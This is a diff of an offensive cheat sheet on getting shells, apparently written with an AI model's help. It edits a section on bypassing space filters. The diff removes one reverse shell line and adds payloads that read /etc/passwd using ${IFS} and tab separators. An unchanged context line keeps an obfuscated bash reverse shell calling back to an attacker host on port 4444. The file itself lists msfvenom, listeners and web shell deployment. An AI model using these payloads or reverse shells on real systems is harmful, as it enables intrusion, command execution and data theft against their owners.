@@ -4,7 +4,7 @@
 
 ## What is this?
 
-Generate, deliver, and catch shells for initial access or post-exploitation command execution. Covers reverse/bind/web shells, msfvenom payload generation, listeners (netcat, pwncat-cs, socat), shell stabilization, and web shell deployment. Goal: interactive shell or RCE on the target.
+Generate, deliver, and catch shells for initial access or post-exploitation command execution. Covers reverse/bind/web shells, msfvenom payload generation, listeners (netcat, pwncat-cs, socat), shell stabilization, and web shell deployment. Goal: interactive shell or RCE on the target. Pairs with [[Exploit & File Transfers]], [[Metasploit]], [[Command Injection]].
 
 ---
 
@@ -502,8 +502,17 @@ powershell -ep bypass -enc $enc
 
 ### IFS bypass (space filter)
 
+`${IFS}` substitutes for spaces in **simple** commands where spaces are filtered — it does NOT
+work for reverse shells, because bash parses redirections (`>&`, `0>&1`) before expanding a
+variable, so redirection operators inside `$cmd` are treated as literal arguments:
+
 ```bash
-IFS=,;cmd=bash,-i,>&,/dev/tcp/10.10.14.x/4444,0>&1;$cmd
+# Works — space-free file read
+cat${IFS}/etc/passwd
+X=$'\t';env${X}-i${X}id            # tab as the separator
+
+# For a reverse shell, use base64 or the variable-substitution form below instead —
+# NOT an IFS-built command string with redirections.
 ```
 
 ### Variable substitution
@@ -553,5 +562,5 @@ c=bas;h=h;$c$h -i >& /dev/tcp/10.10.14.x/4444 0>&1
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-05-14*
+*Updated: 2026-07-21*
 *Model: claude-sonnet-4-6*
